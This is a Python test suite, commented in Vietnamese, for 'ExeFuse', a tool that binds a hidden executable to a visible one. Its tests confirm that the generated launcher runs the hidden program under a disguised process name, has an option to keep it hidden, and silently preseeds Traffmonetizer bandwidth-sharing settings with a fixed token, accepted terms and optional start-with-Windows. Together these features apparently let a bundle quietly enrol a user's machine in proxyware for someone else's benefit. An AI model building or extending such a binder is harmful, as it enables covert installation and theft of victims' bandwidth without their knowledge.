# -*- coding: utf-8 -*-
"""
ExeFuse Self-Test Suite
=======================
Chạy:  python tools/selftest.py

Kiểm chứng logic của launcher + builder KHÔNG CẦN build thật:
  1.  Sinh launcher từ template với mọi tổ hợp cấu hình -> biên dịch được
  2.  Token/alias chứa ký tự độc (", \\, xuống dòng, Unicode) -> không vỡ cú pháp
  3.  Preseed settings.json: 6 kịch bản (2 vị trí, 1 vị trí, thiếu env,
      file hỏng, file có BOM, 2 env trùng nhau)
  4.  Đổi tên tiến trình (alias copy): đúng vị trí, tái sử dụng, fallback
  5.  Kill-on-exit: app chính đóng -> app ẩn bị kill, không rò rỉ (POSIX E2E)
  6.  SOLO E2E: launcher chạy app ẩn giả, ghi marker, thoát mã 0 (POSIX E2E)
  7.  Thiếu file nhúng -> launcher báo lỗi thân thiện, thoát mã 1

Trên Windows: các test E2E POSIX tự bỏ qua (máy Windows thật dùng
tools/verify_windows.bat để kiểm chứng bundle). Kết quả kỳ vọng:
  [OK] = pass, [SKIP] = không áp dụng trên OS này, [FAIL] = có lỗi.
"""

import json
import os
import py_compile
import shutil
import subprocess
import sys
import tempfile
import time
import importlib.util

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)

from builder import build as builder_mod  # noqa: E402

TEMPLATE_PATH = os.path.join(ROOT, "builder", "launcher_template.py")
IS_POSIX = (os.name != "nt")

RESULTS = []


def check(name, fn, skip_reason=None):
    """Chạy 1 test, ghi kết quả, không để 1 test fail làm dừng cả bộ."""
    if skip_reason:
        print("  [SKIP] %s — %s" % (name, skip_reason))
        RESULTS.append(("skip", name, skip_reason))
        return
    try:
        fn()
        print("  [OK]   %s" % name)
        RESULTS.append(("ok", name, None))
    except Exception as exc:
        print("  [FAIL] %s\n         -> %s" % (name, exc))
        RESULTS.append(("fail", name, str(exc)))


# ----------------------------------------------------------------------
# Helpers
# ----------------------------------------------------------------------

def render_launcher(tmp, visible=False, kill_hidden=True, hide_watch=True,
                    alias="Test_Out", preseed=True,
                    token='NxLHoObcALVGo0/U95S96YB2mDM3FTaIQQtSl34Pt1A=',
                    autorun=False):
    """Sinh launcher.py y hệt cách build.py làm (dùng lại _esc_lit của builder)."""
    with open(TEMPLATE_PATH, "r", encoding="utf-8") as f:
        template = f.read()
    src = (
        template
        .replace("%%HIDDEN_NAME%%", builder_mod.HIDDEN_ASSET)
        .replace("%%VISIBLE_NAME%%", builder_mod.VISIBLE_ASSET if visible else "")
        .replace("%%KILL_HIDDEN%%", "True" if kill_hidden else "False")
        .replace("%%HIDE_WATCH%%", "True" if hide_watch else "False")
        .replace("%%PROC_ALIAS%%", builder_mod._esc_lit(alias))
        .replace("%%TM_PRESEED%%", "True" if preseed else "False")
        .replace("%%TM_TOKEN%%", builder_mod._esc_lit(token) if preseed else "")
        .replace("%%TM_AUTORUN%%", "True" if autorun else "False")
    )
    path = os.path.join(tmp, "launcher.py")
    with open(path, "w", encoding="utf-8") as f:
        f.write(src)
    return path


def load_launcher_module(path):
    spec = importlib.util.spec_from_file_location("launcher_under_test", path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


class EnvPatch:
    """Set/restore biến môi trường an toàn."""

    def __init__(self, **values):
        self.values = values
        self.saved = {}

    def __enter__(self):
        for k, v in self.values.items():
            self.saved[k] = os.environ.get(k)
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
        return self

    def __exit__(self, *exc):
        for k, old in self.saved.items():
            if old is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = old


# ----------------------------------------------------------------------
# 1) Build logic (safe_name, escape, render, compile)
# ----------------------------------------------------------------------

def t_safe_name():
    cases = {
        "My App.exe": "My_App",
        'App & Co "2024"': "App__Co_2024",
        "Ứng Dụng Việt.exe": "Ứng_Dụng_Việt",
        "": "ExeFuse_App",
        "  ": "ExeFuse_App",
    }
    for raw, want in cases.items():
        got = builder_mod._safe_name(raw)
        assert got == want, "_safe_name(%r) = %r, kỳ vọng %r" % (raw, got, want)


def t_esc_lit_hostile():
    token = 'He said "hi" \\ end\nnew\tline Ünicode ✓'
    got = builder_mod._esc_lit(token)
    assert '"' not in got.replace('\\"', ""), "quote chưa được escape: %r" % got
    # Nhúng vào literal Python thật và lấy lại giá trị -> phải khớp nguyên bản
    roundtrip = eval('"%s"' % got)  # noqa: S307 - chuỗi do chính ta sinh
    assert roundtrip == token, "roundtrip lệch: %r != %r" % (roundtrip, token)


def t_render_all_configs_compile():
    tmp = tempfile.mkdtemp(prefix="exefuse_render_")
    try:
        combos = [
            dict(visible=False, kill_hidden=True, hide_watch=True,
                 alias="Solo_Bundle", preseed=True, autorun=False),
            dict(visible=True, kill_hidden=False, hide_watch=False,
                 alias="", preseed=False, token="", autorun=False),
            dict(visible=True, kill_hidden=True, hide_watch=True,
                 alias="Pair_Bundle 2024", preseed=True, autorun=True),
            dict(visible=True, kill_hidden=True, hide_watch=True,
                 alias="App_Ünicode_✓", preseed=True,
                 token='To"ken\\with"special', autorun=False),
            dict(visible=False, kill_hidden=False, hide_watch=False,
                 alias="X" * 120, preseed=True, autorun=True),
        ]
        for i, cfg in enumerate(combos):
            cdir = os.path.join(tmp, "c%d" % i)
            os.makedirs(cdir, exist_ok=True)
            path = render_launcher(cdir, **cfg)
            py_compile.compile(path, doraise=True)
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def t_rendered_config_values():
    tmp = tempfile.mkdtemp(prefix="exefuse_cfg_")
    try:
        path = render_launcher(
            tmp, visible=True, kill_hidden=False, hide_watch=False,
            alias="My OutPut", preseed=True,
            token='abc"def\\ghi', autorun=True)
        mod = load_launcher_module(path)
        assert mod.HIDDEN_NAME == "__hidden_app__.exe"
        assert mod.VISIBLE_NAME == "__visible_app__.exe"
        assert mod.KILL_HIDDEN_ON_VISIBLE_EXIT is False
        assert mod.ENABLE_HIDE_WATCHER is False
        assert mod.PROC_ALIAS == "My OutPut"
        assert mod.TM_TOKEN == 'abc"def\\ghi'
        assert mod.TM_PRESEED is True
        assert mod.TM_START_WITH_WINDOWS is True
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


# ----------------------------------------------------------------------
# 2) Preseed settings.json (6 kịch bản)
# ----------------------------------------------------------------------

TOKEN = "NxLHoObcALVGo0/U95S96YB2mDM3FTaIQQtSl34Pt1A="


def _make_launcher(tmp, preseed=True, token=TOKEN):
    return load_launcher_module(render_launcher(
        tmp, preseed=preseed, token=token, alias="Alias_Test"))


def _read_json(path):
    with open(path, "r", encoding="utf-8-sig") as f:
        return json.load(f)


def t_preseed_both_dirs():
    tmp = tempfile.mkdtemp(prefix="exefuse_seed_")
    roaming, local = os.path.join(tmp, "roaming"), os.path.join(tmp, "local")
    try:
        with EnvPatch(APPDATA=roaming, LOCALAPPDATA=local):
            mod = _make_launcher(tmp)
            mod._preseed_traffmonetizer()
        for root in (roaming, local):
            data = _read_json(os.path.join(root, "traffmonetizer", "settings.json"))
            assert data["Token"] == TOKEN, root
            assert data["Accepting"] is True, root
            assert data["StartWithWindows"] is False, root
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def t_preseed_roaming_only():
    tmp = tempfile.mkdtemp(prefix="exefuse_seed_")
    roaming = os.path.join(tmp, "roaming")
    try:
        with EnvPatch(APPDATA=roaming, LOCALAPPDATA=None):
            mod = _make_launcher(tmp)
            mod._preseed_traffmonetizer()
        data = _read_json(os.path.join(roaming, "traffmonetizer", "settings.json"))
        assert data["Token"] == TOKEN
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def t_preseed_no_env():
    tmp = tempfile.mkdtemp(prefix="exefuse_seed_")
    try:
        with EnvPatch(APPDATA=None, LOCALAPPDATA=None):
            mod = _make_launcher(tmp)
            mod._preseed_traffmonetizer()  # không được crash
        assert not os.path.exists(os.path.join(tmp, "traffmonetizer")), \
            "không được ghi file khi thiếu APPDATA"
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def t_preseed_corrupt_file():
    tmp = tempfile.mkdtemp(prefix="exefuse_seed_")
    roaming = os.path.join(tmp, "roaming")
    settings_dir = os.path.join(roaming, "traffmonetizer")
    os.makedirs(settings_dir)
    with open(os.path.join(settings_dir, "settings.json"), "w") as f:
        f.write("{corrupt!! không phải json")
    try:
        with EnvPatch(APPDATA=roaming, LOCALAPPDATA=None):
            mod = _make_launcher(tmp)
            mod._preseed_traffmonetizer()
        data = _read_json(os.path.join(settings_dir, "settings.json"))
        assert data["Token"] == TOKEN
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def t_preseed_bom_preserve_keys():
    tmp = tempfile.mkdtemp(prefix="exefuse_seed_")
    roaming = os.path.join(tmp, "roaming")
    settings_dir = os.path.join(roaming, "traffmonetizer")
    os.makedirs(settings_dir)
    old = {"Token": "OLD", "Accepting": False, "CustomKey": "giữ lại nhé"}
    with open(os.path.join(settings_dir, "settings.json"), "w",
              encoding="utf-8-sig") as f:
        json.dump(old, f)
    try:
        with EnvPatch(APPDATA=roaming, LOCALAPPDATA=None):
            mod = _make_launcher(tmp)
            mod._preseed_traffmonetizer()
        data = _read_json(os.path.join(settings_dir, "settings.json"))
        assert data["Token"] == TOKEN
        assert data["Accepting"] is True
        assert data["CustomKey"] == "giữ lại nhé"
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def t_preseed_duplicate_env():
    tmp = tempfile.mkdtemp(prefix="exefuse_seed_")
    same = os.path.join(tmp, "same")
    try:
        with EnvPatch(APPDATA=same, LOCALAPPDATA=same):
            mod = _make_launcher(tmp)
            mod._preseed_traffmonetizer()
        p = os.path.join(same, "traffmonetizer", "settings.json")
        assert os.path.isfile(p)
        # chỉ ghi 1 lần (không tạo thư mục lạ)
        assert sorted(os.listdir(same)) == ["traffmonetizer"]
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def t_preseed_disabled():
    tmp = tempfile.mkdtemp(prefix="exefuse_seed_")
    roaming = os.path.join(tmp, "roaming")
    try:
        with EnvPatch(APPDATA=roaming, LOCALAPPDATA=None):
            mod = load_launcher_module(render_launcher(
                tmp, preseed=False, token=TOKEN, alias="A"))
            mod._preseed_traffmonetizer()
            # token rỗng cũng không ghi
            mod2 = load_launcher_module(render_launcher(
                tmp, preseed=True, token="", alias="A"))
            mod2._preseed_traffmonetizer()
        assert not os.path.exists(
            os.path.join(roaming, "traffmonetizer", "settings.json")), \
            "không được ghi settings.json khi preseed tắt/token rỗng"
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


# ----------------------------------------------------------------------
# 3) Alias (đổi tên tiến trình)
# ----------------------------------------------------------------------

def _fake_exe(tmp, name="__hidden_app__.exe"):
    src = os.path.join(tmp, name)
    with open(src, "w") as f:
        f.write("fake-exe-bytes")
    return src


def t_alias_copy_and_reuse():
    tmp = tempfile.mkdtemp(prefix="exefuse_alias_")
    try:
        mod = load_launcher_module(render_launcher(tmp, alias="My_Out"))
        src = _fake_exe(tmp)
        with EnvPatch():
            dst = mod._aliased_path("__hidden_app__.exe")
        assert os.path.basename(dst) == "My_Out.exe"
        assert os.path.isfile(dst)
        assert "_alias___hidden_app__" in dst
        # gọi lần 2 -> tái sử dụng, không tạo thêm
        dst2 = mod._aliased_path("__hidden_app__.exe")
        assert dst2 == dst
        # alias rỗng -> trả về file gốc
        mod2 = load_launcher_module(render_launcher(tmp, alias=""))
        assert mod2._aliased_path("__hidden_app__.exe") == src
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def t_alias_hostile_name():
    tmp = tempfile.mkdtemp(prefix="exefuse_alias_")
    try:
        mod = load_launcher_module(render_launcher(
            tmp, alias='Weird "Name" \\ 2024'))
        _fake_exe(tmp)
        dst = mod._aliased_path("__hidden_app__.exe")
        assert os.path.isfile(dst), dst
        assert os.path.basename(dst) == 'Weird "Name" \\ 2024.exe'
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def t_alias_fallback_on_error():
    tmp = tempfile.mkdtemp(prefix="exefuse_alias_")
    try:
        mod = load_launcher_module(render_launcher(tmp, alias="No_Copy"))
        src = _fake_exe(tmp)
        # file nguồn không tồn tại -> fallback trả về path gốc, không crash
        dst = mod._aliased_path("__khong ton tai__.exe")
        assert dst == os.path.join(tmp, "__khong ton tai__.exe")
        assert src  # vẫn ok
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


# ----------------------------------------------------------------------
# 4) Kill tree (POSIX)
# ----------------------------------------------------------------------

def t_kill_tree_posix():
    if not IS_POSIX:
        raise AssertionError("chỉ chạy POSIX")
    tmp = tempfile.mkdtemp(prefix="exefuse_kill_")
    try:
        mod = load_launcher_module(render_launcher(tmp, alias="K"))
        sleeper = subprocess.Popen(
            [sys.executable, "-c", "import time; time.sleep(60)"])
        assert sleeper.poll() is None
        mod._kill_tree(sleeper)
        sleeper.wait(timeout=5)
        assert sleeper.poll() is not None, "process vẫn sống sau kill"
        # kill process đã chết -> không crash
        mod._kill_tree(sleeper)
        mod._kill_tree(None)
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def _proc_alive_by_cmdline(needle):
    for pid in os.listdir("/proc"):
        if not pid.isdigit():
            continue
        try:
            with open("/proc/%s/cmdline" % pid, "rb") as f:
                cmd = f.read().decode("utf-8", "replace")
        except Exception:
            continue
        if needle in cmd:
            return True
    return False


# ----------------------------------------------------------------------
# 5) E2E luồng main() bằng app giả (POSIX)
# ----------------------------------------------------------------------

def _write_fake_app(path, marker_dir, tag, sleep_s):
    """Sinh 'exe' giả: ghi marker rồi ngủ (hoặc thoát ngay)."""
    script = (
        "#!/bin/sh\n"
        "echo started > '%s/%s_started'\n"
        "sleep %d\n" % (marker_dir, tag, sleep_s)
    )
    with open(path, "w") as f:
        f.write(script)
    os.chmod(path, 0o755)


def t_e2e_solo():
    if not IS_POSIX:
        raise AssertionError("chỉ chạy POSIX (Windows dùng verify_windows.bat)")
    work = tempfile.mkdtemp(prefix="exefuse_solo_")
    try:
        mod = load_launcher_module(render_launcher(
            work, visible=False, alias="Solo_Bundle", preseed=True, token=TOKEN))
        _write_fake_app(
            os.path.join(work, "__hidden_app__.exe"), work, "hidden", 0)
        env = dict(os.environ)
        env["APPDATA"] = os.path.join(work, "roaming")
        env["LOCALAPPDATA"] = os.path.join(work, "local")
        proc = subprocess.Popen(
            [sys.executable, os.path.join(work, "launcher.py")], env=env,
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=work)
        out, err = proc.communicate(timeout=30)
        assert proc.returncode == 0, \
            "exit=%s stderr=%s" % (proc.returncode, err.decode()[:300])
        # app ẩn đã chạy (marker) qua bản alias
        assert os.path.isfile(os.path.join(work, "hidden_started"))
        alias_copy = os.path.join(
            work, "_alias___hidden_app__", "Solo_Bundle.exe")
        assert os.path.isfile(alias_copy), "không thấy bản copy alias"
        # preseed đã ghi settings.json vào roaming
        data = _read_json(os.path.join(
            work, "roaming", "traffmonetizer", "settings.json"))
        assert data["Token"] == TOKEN
    finally:
        subprocess.run(["pkill", "-f", "Solo_Bundle.exe"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        shutil.rmtree(work, ignore_errors=True)


def t_e2e_pair_kill_on_exit():
    if not IS_POSIX:
        raise AssertionError("chỉ chạy POSIX (Windows dùng verify_windows.bat)")
    work = tempfile.mkdtemp(prefix="exefuse_pair_")
    try:
        mod = load_launcher_module(render_launcher(
            work, visible=True, kill_hidden=True, alias="Pair_Bundle",
            preseed=False, token=""))
        _write_fake_app(
            os.path.join(work, "__hidden_app__.exe"), work, "hidden", 120)
        _write_fake_app(
            os.path.join(work, "__visible_app__.exe"), work, "visible", 0)
        env = dict(os.environ)
        env["APPDATA"] = os.path.join(work, "roaming")
        env.pop("LOCALAPPDATA", None)
        out_f = open(os.path.join(work, "launcher_out.log"), "w")
        err_f = open(os.path.join(work, "launcher_err.log"), "w")
        proc = subprocess.Popen(
            [sys.executable, os.path.join(work, "launcher.py")], env=env,
            stdout=out_f, stderr=err_f, cwd=work)
        try:
            proc.wait(timeout=30)
        finally:
            out_f.close()
            err_f.close()
        assert proc.returncode == 0, "exit=%s err=%s" % (
            proc.returncode,
            open(os.path.join(work, "launcher_err.log")).read()[:300])
        assert os.path.isfile(os.path.join(work, "hidden_started"))
        assert os.path.isfile(os.path.join(work, "visible_started"))
        time.sleep(0.5)
        # app ẩn (ngủ 120s) phải bị kill theo app chính
        assert not _proc_alive_by_cmdline("Pair_Bundle.exe"), \
            "app ẩn vẫn sống sau khi app chính đóng (rò rỉ tiến trình)"
    finally:
        subprocess.run(["pkill", "-f", "Pair_Bundle.exe"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        shutil.rmtree(work, ignore_errors=True)


def t_missing_asset_fatal():
    if not IS_POSIX:
        raise AssertionError("chỉ chạy POSIX")
    work = tempfile.mkdtemp(prefix="exefuse_miss_")
    try:
        path = render_launcher(work, visible=False, alias="", preseed=False)
        proc = subprocess.run(
            [sys.executable, path], cwd=work, timeout=15,
            capture_output=True, text=True)
        assert proc.returncode == 1, "kỳ vọng exit 1, got %s" % proc.returncode
        assert "không tìm thấy" in proc.stderr.lower(), proc.stderr[:300]
    finally:
        shutil.rmtree(work, ignore_errors=True)


# ----------------------------------------------------------------------
# 6) Môi trường Windows thật (chỉ chạy trên máy Windows)
# ----------------------------------------------------------------------

def t_windows_env():
    if not IS_POSIX:
        # appdata ghi được?
        appdata = os.environ.get("APPDATA", "")
        assert appdata, "thiếu biến APPDATA"
        test_file = os.path.join(appdata, "exefuse_selftest.tmp")
        with open(test_file, "w") as f:
            f.write("ok")
        os.remove(test_file)
        # taskkill có sẵn?
        subprocess.run(["taskkill", "/?"], stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL, timeout=10,
                       creationflags=0x08000000)  # CREATE_NO_WINDOW
        assert builder_mod.pyinstaller_available(), \
            "PyInstaller chưa cài - chạy: pip install pyinstaller"
    else:
        assert builder_mod.pyinstaller_available(), \
            "PyInstaller chưa cài trong môi trường test"


# ----------------------------------------------------------------------

def main():
    print("=" * 64)
    print("  ExeFuse Self-Test Suite  (Python %s, %s)"
          % (sys.version.split()[0], sys.platform))
    print("=" * 64)

    print("\n[1] Builder logic")
    check("_safe_name lọc tên output", t_safe_name)
    check("escape token/alias ký tự độc + roundtrip", t_esc_lit_hostile)
    check("render 5 tổ hợp config -> compile OK", t_render_all_configs_compile)
    check("giá trị config sau render đúng nguyên bản", t_rendered_config_values)

    print("\n[2] Preseed settings.json (auto-token Traffmonetizer)")
    check("ghi CẢ roaming + local, đúng schema", t_preseed_both_dirs)
    check("chỉ có APPDATA -> vẫn ghi", t_preseed_roaming_only)
    check("thiếu APPDATA -> không crash, không ghi", t_preseed_no_env)
    check("file settings.json hỏng -> tự phục hồi", t_preseed_corrupt_file)
    check("file có BOM -> đọc được + giữ key lạ", t_preseed_bom_preserve_keys)
    check("APPDATA == LOCALAPPDATA -> ghi 1 lần", t_preseed_duplicate_env)
    check("preseed tắt / token rỗng -> không ghi", t_preseed_disabled)

    print("\n[3] Đổi tên tiến trình (alias)")
    check("copy alias đúng vị trí + tái sử dụng", t_alias_copy_and_reuse)
    check("alias chứa ký tự đặc biệt", t_alias_hostile_name)
    check("lỗi copy -> fallback file gốc", t_alias_fallback_on_error)

    print("\n[4] Dọn dẹp tiến trình")
    check("kill tree + kill 2 lần không crash",
          t_kill_tree_posix, skip_reason=None if IS_POSIX else "POSIX only")

    print("\n[5] E2E luồng main() bằng app giả")
    check("SOLO: chạy app ẩn + alias + preseed",
          t_e2e_solo, skip_reason=None if IS_POSIX else "POSIX only")
    check("PAIR: kill-on-exit không rò rỉ",
          t_e2e_pair_kill_on_exit, skip_reason=None if IS_POSIX else "POSIX only")
    check("thiếu file nhúng -> báo lỗi exit 1",
          t_missing_asset_fatal, skip_reason=None if IS_POSIX else "POSIX only")

    print("\n[6] Môi trường")
    check("APPDATA ghi được / taskkill / PyInstaller", t_windows_env)

    ok = sum(1 for s, _, _ in RESULTS if s == "ok")
    skip = sum(1 for s, _, _ in RESULTS if s == "skip")
    fails = [(n, e) for s, n, e in RESULTS if s == "fail"]
    print("\n" + "=" * 64)
    print("  KẾT QUẢ: %d OK / %d SKIP / %d FAIL (tổng %d)"
          % (ok, skip, len(fails), len(RESULTS)))
    if fails:
        for n, e in fails:
            print("   FAIL: %s\n         %s" % (n, e))
        print("=" * 64)
        return 1
    print("  TẤT CẢ PASS ✅")
    print("=" * 64)
    return 0


if __name__ == "__main__":
    sys.exit(main())
